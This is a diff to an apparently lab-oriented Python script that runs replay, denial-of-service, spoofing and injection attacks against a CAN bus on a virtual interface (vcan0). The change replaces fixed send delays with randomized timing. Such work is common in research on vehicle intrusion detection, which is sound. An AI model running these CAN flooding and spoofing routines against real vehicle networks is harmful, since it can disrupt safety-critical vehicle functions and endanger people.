@@ -7,7 +7,9 @@ def replay_attack(bus, recorded_messages, duration):
     while time.time() - start < duration:
         for msg in recorded_messages:
             bus.send(msg)
-            time.sleep(0.02)
+            # time.sleep(0.02)
+            # Send attack a random time between 0.01 and 0.05 seconds
+            time.sleep(random.uniform(0.01, 0.05))
 
 def dos_attack(bus, duration):
     msg = can.Message(arbitration_id=0x000, data=[0xEE]*1, is_extended_id=False)
@@ -15,7 +17,8 @@ def dos_attack(bus, duration):
     while time.time() - start < duration:
         try:
             bus.send(msg)
-            time.sleep(0.01)
+            # time.sleep(0.01)
+            time.sleep(random.uniform(0.01, 0.05))
             print("Sending dos message")
         except Exception as e:
             print(e)
@@ -42,7 +45,8 @@ def spoofing_attack(bus, duration):
     while time.time() - start < duration:
         msg = can.Message(arbitration_id=spoofed_id, data=[random.randint(0x00, 0x01) for _ in range(1)], is_extended_id=False)
         bus.send(msg)
-        time.sleep(0.02)
+        # time.sleep(0.02)
+        time.sleep(random.uniform(0.01, 0.05))
 
 def injection_attack(bus, duration):
     fake_commands = [
@@ -54,7 +58,8 @@ def injection_attack(bus, duration):
     while time.time() - start < duration:
         for msg in fake_commands:
             bus.send(msg)
-            time.sleep(0.02)
+            # time.sleep(0.02)
+            time.sleep(random.uniform(0.01, 0.05))
 
 def capture_messages(bus, duration=2):
     captured = []
@@ -69,7 +74,6 @@ def main():
     INTERFACE = 'socketcan'    
     BUSTYPE = 'can0'
 
-    # bus = can.interface.Bus(channel=INTERFACE, bustype=BUSTYPE, receive_own_messages=True)
     bus = can.ThreadSafeBus(interface='socketcan', channel='vcan0', receive_own_messages=True)
     recorded_messages = capture_messages(bus, duration=2)
 
@@ -81,7 +85,7 @@ def main():
         ("Injection Attack", injection_attack, None),
     ]
 
-    duration_per_attack = 30 
+    duration_per_attack = 30
 
     for name, attack_fn, arg in attacks:
         print(f"\n=== STARTING: {name} ===")
